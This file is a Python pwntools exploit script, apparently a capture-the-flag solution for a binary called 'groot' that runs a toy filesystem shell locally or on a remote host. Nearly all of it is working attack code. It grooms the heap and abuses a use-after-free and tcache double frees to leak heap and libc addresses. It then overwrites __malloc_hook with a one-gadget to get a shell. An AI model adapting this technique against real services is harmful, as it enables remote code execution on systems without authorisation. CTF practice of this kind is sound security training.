# wow this is a mess plz don't read
# (also note that it's not 100% reliable, maybe ~75%)
# - wait_what

import sys
from pwn import *

if 1:
    r = process('./groot')
    #gdb.attach(r)
else:
    r = remote('54.238.202.201', 31733)

wla = r.writelineafter
ru = r.readuntil

def do_ls(x): wla('$', 'ls {}'.format(x))
def do_cat(x): wla('$', 'cat {}'.format(x))
def do_cd(x): wla('$', 'cd {}'.format(x))
def do_rm(x): wla('$', 'rm {}'.format(x))
def do_mkdir(x): wla('$', 'mkdir {}'.format(x))
def do_mkfile(x, y):
    wla('$', 'mkfile {}'.format(x))
    r.writeafter('Content?', y)

# do stuff in these dirs so we don't get random allocs into the 0x20 tcache bin
xdir = 'A'*0x19
ydir = 'B'*0x19

do_cd('/')
do_mkdir(xdir)
do_cd(xdir)

# create some allocs that'll get placed in the 0x20 tcache bin
# some of these will be freed to get the leak, others will be used to buffer
# the corrupted double frees in the tcache later
n4 = 5
for i in range(n4):
    do_mkfile('e{}'.format(str(i)*0x20), str(i)*0x10)

n3 = 5
for i in range(n3):
    do_mkfile('r{}'.format(str(i)*0x20), str(i)*0x10)

# fill up 0x20 tcache
n = 5
for i in range(n):
    do_mkfile('q{}'.format(str(i)*0x20), str(i)*0x10)

for i in range(n):
    do_rm('q{}'.format(str(i)*0x20))

for i in range(n):
    do_mkdir('q{}'.format(str(i)*0x20))


do_cd('/')
do_mkdir(ydir)
do_cd(ydir)

n2 = 10
for i in range(n2):
    do_mkdir('a{}'.format(i)*0x10)

asdfile = 'asdffdsa' + 'z'*0x20
do_mkdir(asdfile)

outer = 'outx{}'.format('0'*0x20)
# dir to free
do_mkdir(outer)
do_cd(outer)

# this gets freed when outer is freed (0x20 tcache pointer gets written to beginning of name buffer)
do_mkdir('1'+'0'*0x10)


# free outer (and inner)
do_cd('/{}'.format(ydir))
do_rm(outer)

reclaim = 'recl{}'.format('0'*0x20)
# reclaim outer's mem
do_mkdir(reclaim)

# leak tcache pointer out of stale child pointer's name field
do_ls(reclaim)


ru('\t')
ru('\t')
heap_leak = u64(ru('\x1B[0m\t', True)[:8].ljust(8, '\0'))
if not heap_leak:
    print 'invalid heap_leak'
    sys.exit()

print 'heap leak: 0x{:x}'.format(heap_leak)
data_leak_loc = heap_leak + 0x2a8
print 'data leak at: 0x{:x}'.format(data_leak_loc)
reclaim_name_loc = heap_leak + 0x2a8 + 0xb8
print 'reclaim name at: 0x{:x}'.format(reclaim_name_loc)




# double free inner to cause 0x20 and 0x40 tcaches to be looped back on themselves
do_rm('/{}/{}/{}'.format(ydir, reclaim, p64(heap_leak)))

# ---------------

# te[20] -> A -> A
do_ls(p64(reclaim_name_loc))

# te[20] -> A -> name
do_ls('asdf')

# te[20] ->  name
do_ls(p64(data_leak_loc))
# data_leak_loc is written to `name`


# ---------------

for i in range(n3):
    do_rm('/{}/r{}'.format(xdir, str(i)*0x20))

do_ls('')
ru('\t')
ru('\t')
asdf = '\x1B[0m\t\n\n'
fdsa = '\x1B[38;5;153m'
data = ru(asdf, True).replace(fdsa,'')
print '"leak"', repr(data)

# pointer to root dir node in data section
data_leak = u64(data[-6:].ljust(8, '\0'))
print 'data leak: 0x{:x}'.format(data_leak)

for i in range(n2/2):
    do_rm('a{}'.format(i)*0x10)



# !!!!!!!!!!!!!!

adir = 'Z'*0x19
do_cd('/')
do_mkdir(adir)
do_cd(adir)

leakfile= 'lf{}'.format('1'*0x20)
do_mkfile(leakfile, '*'*0x20)

out2 = 'out2{}'.format('1'*0x20)
do_mkdir(out2)
do_cd(out2)

in2 = 'in2{}'.format('2'+'1'*0x10)
do_mkdir(in2)

# free outer (and inner)
do_cd('/{}'.format(adir))
do_rm(out2)

rec2 = 'rec2{}'.format('1'*0x20)
# reclaim outer's mem
do_mkdir(rec2)

# leak tcache pointer out of stale child pointer's name field
do_ls(rec2)


ru('\t')
ru('\t')
blah = ru('\x1B[0m\t', True)
print repr(blah)
test_leak = u64(blah[:8].ljust(8, '\0'))
print 'heap2', hex(test_leak)
content_loc = test_leak + 0xd8
print 'content', hex(content_loc)
libc_leak_loc = data_leak - (0x204040-0x203f88)

# double free inner to cause 0x20 and 0x40 tcaches to be looped back on themselves
do_rm('/{}/{}/{}'.format(adir, rec2, p64(test_leak)))

# te[20] -> A -> A
do_ls(p64(content_loc))

# te[20] -> A -> name
do_ls('asdf')

# te[20] ->  name
do_ls(p64(libc_leak_loc))
# data_leak_loc is written to `name`

for i in range(n4):
    do_rm('/{}/e{}'.format(xdir, str(i)*0x20))

do_cat(leakfile)

libc = u64(ru('$ ', True)[1:8].ljust(8, '\0'))
print 'libc', hex(libc)

r.writeline('ls /')

for i in range(n2/2, n2):
    do_rm('a{}'.format(i)*0x10)

print '-'*50
# !!!!!!!!!!!!!!

bdir = 'H'*0x19
do_cd('/')
do_mkdir(bdir)
do_cd(bdir)

out3 = 'out3{}'.format('2'*0x20)
do_mkdir(out3)
do_cd(out3)

in3 = 'in3{}'.format('3'+'2'*0x10)
do_mkdir(in3)

# free outer (and inner)
do_cd('/{}'.format(bdir))
do_rm(out3)

rec3 = 'rec3{}'.format('2'*0x20)
# reclaim outer's mem
do_mkdir(rec3)


do_cd('/{}/{}'.format(ydir, asdfile))
# leak tcache pointer out of stale child pointer's name field
#do_ls(rec3)
do_ls('/{}/{}'.format(bdir, rec3))


ru('\t')
ru('\t')
blah3 = ru('\x1B[0m\t', True)
print repr(blah3)
test_leak3 = u64(blah3[:8].ljust(8, '\0'))
print 'tl3', hex(test_leak3)
malloc_hook = libc + 0x354bc0
print 'malloc hook', hex(malloc_hook)
libc_base = libc - 0x97070
#onegadget = libc_base + 0x4f322
#onegadget = libc_base + 0x4f2c5
onegadget = libc_base + 0x10a38c
print hex(onegadget)

# double free inner to cause 0x20 and 0x40 tcaches to be looped back on themselves
do_rm('/{}/{}/{}'.format(bdir, rec3, p64(test_leak3)))

# te[20] -> A -> A
do_ls(p64(malloc_hook))

# te[20] -> A -> name
do_ls('asdf')

# te[20] ->  name
do_ls(p64(onegadget))
# data_leak_loc is written to `name`

do_mkfile('test','asdf')
r.interactive()


